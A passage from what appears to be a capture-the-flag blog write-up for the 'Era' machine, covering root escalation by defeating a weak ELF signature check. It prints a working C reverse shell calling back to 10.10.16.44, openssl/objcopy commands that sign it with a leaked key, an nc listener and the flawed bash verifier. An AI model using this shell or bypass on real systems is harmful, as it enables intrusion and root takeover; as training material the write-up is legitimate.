+</span></span><span style=display:flex><span>eric@era:~$
+</span></span></code></pre></div><h1 id=ii-elf-binaries-signing>II. ELF binaries signing</h1><p>Enumerating the machine after foothold, we discover the kinda monitoring
+program running periodically at <code>/opt/AV/periodic-checks</code>: it runs <code>monitor</code>
+and outputs logs to <code>status.log</code>.</p><p>To be able to read/write to <code>monitor</code>, we need to get shell as <code>eric</code>, as he is
+a member of <code>devs</code> group which has access over the periodic checks directory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>eric@era:~$ id
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
+</span></span></code></pre></div><p>Manual execution of <code>monitor</code> returns the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>eric@era:~$ /opt/AV/periodic-checks/monitor 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>[*] System scan initiated...
+</span></span><span style=display:flex><span>[*] No threats detected. Shutting down...
+</span></span></code></pre></div><p>In fact, there is nothing special about that program, all it does is to print
+the first line to console, sleeps for 3 seconds, and then prints the second
+line. Dissassembling <code>monitor</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ objdump -d monitor &gt; monitor.asm 
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#75715e># ...SNIP...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#960050;background-color:#1e0010>0000000000001169</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#a6e22e>main</span><span style=color:#960050;background-color:#1e0010>&gt;</span>:
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>1169:</span>       <span style=color:#a6e22e>f3</span> <span style=color:#ae81ff>0</span><span style=color:#66d9ef>f</span> <span style=color:#ae81ff>1</span><span style=color:#66d9ef>e</span> <span style=color:#66d9ef>fa</span>             <span style=color:#66d9ef>endbr64</span>
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>116</span>d:       <span style=color:#960050;background-color:#1e0010>55</span>                      <span style=color:#a6e22e>push</span>   %rbp
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>116</span>e:       <span style=color:#960050;background-color:#1e0010>48</span> <span style=color:#960050;background-color:#1e0010>89</span> <span style=color:#a6e22e>e5</span>                <span style=color:#66d9ef>mov</span>    %rsp,%rbp
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>1171:</span>       <span style=color:#960050;background-color:#1e0010>48</span> <span style=color:#960050;background-color:#1e0010>8</span><span style=color:#a6e22e>d</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>90</span> <span style=color:#ae81ff>0</span><span style=color:#66d9ef>e</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>    <span style=color:#66d9ef>lea</span>    <span style=color:#ae81ff>0xe90</span>(%rip),%rax        <span style=color:#75715e># 2008 &lt;_IO_stdin_used+0x8&gt;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#960050;background-color:#1e0010>1178:</span>       <span style=color:#960050;background-color:#1e0010>48</span> <span style=color:#960050;background-color:#1e0010>89</span> <span style=color:#a6e22e>c7</span>                <span style=color:#66d9ef>mov</span>    %rax,%rdi
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>117</span>b:       <span style=color:#a6e22e>e8</span> <span style=color:#66d9ef>e0</span> <span style=color:#66d9ef>fe</span> <span style=color:#66d9ef>ff</span> <span style=color:#66d9ef>ff</span>          <span style=color:#66d9ef>call</span>   <span style=color:#ae81ff>1060</span> &lt;<span style=color:#66d9ef>puts@plt</span>&gt;
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>1180:</span>       <span style=color:#a6e22e>bf</span> <span style=color:#ae81ff>03</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>          <span style=color:#66d9ef>mov</span>    <span style=color:#66d9ef>$0x3</span>,%edi
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>1185:</span>       <span style=color:#a6e22e>b8</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>          <span style=color:#66d9ef>mov</span>    <span style=color:#66d9ef>$0x0</span>,%eax
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>118</span>a:       <span style=color:#a6e22e>e8</span> <span style=color:#66d9ef>e1</span> <span style=color:#66d9ef>fe</span> <span style=color:#66d9ef>ff</span> <span style=color:#66d9ef>ff</span>          <span style=color:#66d9ef>call</span>   <span style=color:#ae81ff>1070</span> &lt;<span style=color:#66d9ef>sleep@plt</span>&gt;
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>118</span>f:       <span style=color:#960050;background-color:#1e0010>48</span> <span style=color:#960050;background-color:#1e0010>8</span><span style=color:#a6e22e>d</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>92</span> <span style=color:#ae81ff>0</span><span style=color:#66d9ef>e</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>    <span style=color:#66d9ef>lea</span>    <span style=color:#ae81ff>0xe92</span>(%rip),%rax        <span style=color:#75715e># 2028 &lt;_IO_stdin_used+0x28&gt;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#960050;background-color:#1e0010>1196:</span>       <span style=color:#960050;background-color:#1e0010>48</span> <span style=color:#960050;background-color:#1e0010>89</span> <span style=color:#a6e22e>c7</span>                <span style=color:#66d9ef>mov</span>    %rax,%rdi
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>1199:</span>       <span style=color:#a6e22e>e8</span> <span style=color:#66d9ef>c2</span> <span style=color:#66d9ef>fe</span> <span style=color:#66d9ef>ff</span> <span style=color:#66d9ef>ff</span>          <span style=color:#66d9ef>call</span>   <span style=color:#ae81ff>1060</span> &lt;<span style=color:#66d9ef>puts@plt</span>&gt;
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>119</span>e:       <span style=color:#a6e22e>b8</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>          <span style=color:#66d9ef>mov</span>    <span style=color:#66d9ef>$0x0</span>,%eax
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>11</span>a3:       <span style=color:#960050;background-color:#1e0010>5</span><span style=color:#a6e22e>d</span>                      <span style=color:#66d9ef>pop</span>    %rbp
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>11</span>a4:       <span style=color:#a6e22e>c3</span>                      <span style=color:#66d9ef>ret</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># ...SNIP...
+</span></span></span></code></pre></div><p>If we try to replace <code>monitor</code> with a bash script, we get the following logs:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>eric@era:~$ cat /opt/AV/periodic-checks/status.log
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>objcopy: /opt/AV/periodic-checks/monitor: file format not recognized
+</span></span><span style=display:flex><span>[ERROR] Executable not signed. Tampering attempt detected. Skipping.
+</span></span></code></pre></div><p>If we try to replace <code>monitor</code> with an arbitrary ELF, we get the logs below,
+meaning that the program will verify the signature in the <code>.text_sig</code> section
+of the target binary and abort execution if it is non-existent or non-valid.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>eric@era:~$ cp /bin/ls /opt/AV/periodic-checks/monitor
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>eric@era:~$ cat /opt/AV/periodic-checks/status.log 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>objcopy: /opt/AV/periodic-checks/monitor: can&#39;t dump section &#39;.text_sig&#39; - it does not exist: file format not recognized
+</span></span><span style=display:flex><span>[ERROR] Executable not signed. Tampering attempt detected. Skipping.
+</span></span></code></pre></div><p>Now here where it gets a bit obscure; searching ELF binary signing will yield
+multiple results where most of them are outdated: Github repos, tools like
+<code>elfsign</code> and <code>elfverify</code>, &mldr;etc.</p><p>If you are familiar enough with OpenSSL on Linux, this would be an easy task
+for you, otherwise you would be deep down rabbit holes looking for tools that
+don&rsquo;t work. With OpenSSL, we can sign a file using the signer certificate and
+the corresponding private key. Once the signature computed, we can leverage
+<code>objcopy</code> to copy the latter to the custom section <code>.text_sig</code> in the target
+file.</p><p>Back from the admin session on <code>file.era.htb</code>, we found a file <code>signing.zip</code>.
+This file contains the private key <code>key.pem</code> that we&rsquo;ll be using subsequently.</p><p>Consider the following reverse shell (<code>reverse.c</code>) for instance:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/socket.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;netinet/in.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;arpa/inet.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>){
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> port <span style=color:#f92672>=</span> <span style=color:#ae81ff>1235</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> sockaddr_in revsockaddr;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> sockt <span style=color:#f92672>=</span> <span style=color:#a6e22e>socket</span>(AF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    revsockaddr.sin_family <span style=color:#f92672>=</span> AF_INET;       
+</span></span><span style=display:flex><span>    revsockaddr.sin_port <span style=color:#f92672>=</span> <span style=color:#a6e22e>htons</span>(port);
+</span></span><span style=display:flex><span>    revsockaddr.sin_addr.s_addr <span style=color:#f92672>=</span> <span style=color:#a6e22e>inet_addr</span>(<span style=color:#e6db74>&#34;10.10.16.44&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>connect</span>(sockt, (<span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>) <span style=color:#f92672>&amp;</span>revsockaddr, 
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>sizeof</span>(revsockaddr));
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>dup2</span>(sockt, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>dup2</span>(sockt, <span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>dup2</span>(sockt, <span style=color:#ae81ff>2</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>const</span> argv[] <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;bash&#34;</span>, NULL};
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>execvp</span>(<span style=color:#e6db74>&#34;bash&#34;</span>, argv);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;       
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Compiling and signing the output binary (note that the information in <code>subj</code>
+can be found in <code>x509.genkey</code> from <code>signing.zip</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>eric@era:/tmp$ gcc reverse.c -o reverse
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>eric@era:/tmp$ openssl req -new -x509 -key signing/key.pem -out cert.pem -days 365 -subj &#34;/CN=Era Inc./emailAddress=yurivich@era.com&#34;
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>eric@era:/tmp$ openssl cms -sign -in reverse -signer cert.pem -inkey signing/key.pem -outform DER -nosmimecap -nocerts -noattr -out reverse.sig 
+</span></span></code></pre></div><p>Copying the signature to the <code>reverse</code> binary:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>eric@era:/tmp$ objcopy --add-section .text_sig=reverse.sig reverse reverse.signed
+</span></span></code></pre></div><p>Now that our binary is signed, all that is left is to put it in place of
+<code>monitor</code> and listen to the connection comming back to us with root privileges.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>eric@era:/tmp$ cp reverse.signed /opt/AV/periodic-checks/monitor
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ nc -lnvp <span style=color:#ae81ff>1235</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>listening on [any] 1235 ...
+</span></span><span style=display:flex><span>connect to [10.10.16.44] from (UNKNOWN) [10.10.11.79] 54218
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>uid=0(root) gid=0(root) groups=0(root)
+</span></span></code></pre></div><h1 id=iv-post-compromise>IV. Post compromise</h1><p>The following is the Bash script responsible for the periodic checks. Notice
+that the script checks only if the signature was produced by the right
+organization (and the right email) and not the signature itself. This is a bad
+procedure because it allows for signature re-use by anyone with access to a
+valid signature.</p><p>The following is the Bash script responsible for periodic checks. Notice that
+the script verifies only whether the signature was produced by the correct
+organization (and the correct email) rather than validating the signature
+itself. This is a flawed procedure because it allows for:</p><ol><li>The reuse of signatures by anyone with access to a valid signature.</li><li>Signing the binaries with rogue/self-signed certificates with spoofed
+organization/email attributes.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Paths</span>
+</span></span><span style=display:flex><span>BINARY<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/opt/AV/periodic-checks/monitor&#34;</span>
+</span></span><span style=display:flex><span>SECTION<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;.text_sig&#34;</span>
+</span></span><span style=display:flex><span>EXTRACTED_SECTION<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text_sig_section.bin&#34;</span>
+</span></span><span style=display:flex><span>ORGANIZATION<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Era Inc.&#34;</span>
+</span></span><span style=display:flex><span>EMAIL<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yurivich@era.com&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Extract the .text_sig section</span>
+</span></span><span style=display:flex><span>objcopy --dump-section <span style=color:#e6db74>&#34;</span>$SECTION<span style=color:#e6db74>&#34;</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$EXTRACTED_SECTION<span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span>$BINARY<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Parse the ASN.1 structure</span>
+</span></span><span style=display:flex><span>OUTPUT<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>openssl asn1parse -inform DER -in <span style=color:#e6db74>&#34;</span>$EXTRACTED_SECTION<span style=color:#e6db74>&#34;</span> 2&gt;/dev/null<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> $? -ne <span style=color:#ae81ff>0</span> <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>    echo <span style=color:#e6db74>&#34;[ERROR] Executable not signed. Tampering attempt detected. Skipping.&#34;</span>
+</span></span><span style=display:flex><span>    rm -f <span style=color:#e6db74>&#34;</span>$EXTRACTED_SECTION<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    exit <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Check for the organization name</span>
+</span></span><span style=display:flex><span>ORG_CHECK<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo <span style=color:#e6db74>&#34;</span>$OUTPUT<span style=color:#e6db74>&#34;</span> | grep -oP <span style=color:#e6db74>&#34;(?&lt;=UTF8STRING        :)</span>$ORGANIZATION<span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Check for the email address</span>
+</span></span><span style=display:flex><span>EMAIL_CHECK<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo <span style=color:#e6db74>&#34;</span>$OUTPUT<span style=color:#e6db74>&#34;</span> | grep -oP <span style=color:#e6db74>&#34;(?&lt;=IA5STRING         :)</span>$EMAIL<span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Decision logic</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> <span style=color:#e6db74>&#34;</span>$ORG_CHECK<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;</span>$ORGANIZATION<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#e6db74>&#34;</span>$EMAIL_CHECK<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;</span>$EMAIL<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>    $BINARY
+</span></span><span style=display:flex><span>    echo <span style=color:#e6db74>&#34;[SUCCESS] No threats detected.&#34;</span>
+</span></span><span style=display:flex><span>    ALLOW<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>    echo <span style=color:#e6db74>&#34;[FAILURE] Binary has been tampered with. Skipping.&#34;</span>
+</span></span><span style=display:flex><span>    ALLOW<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Cleanup</span>
+</span></span><span style=display:flex><span>rm -f <span style=color:#e6db74>&#34;</span>$EXTRACTED_SECTION<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Exit with appropriate status</span>
+</span></span><span style=display:flex><span>exit $ALLOW
+</span></span></code></pre></div></div></div></main></div><footer class=footer><span>© 2025 alfa7i7, Built with
+<a href=https://gohugo.io class=footerLink>Hugo</a> and
+<a href=https://github.com/LordMathis/hugo-theme-nightfall class=footerLink>Nightfall</a> theme</span></footer></div></body></html>
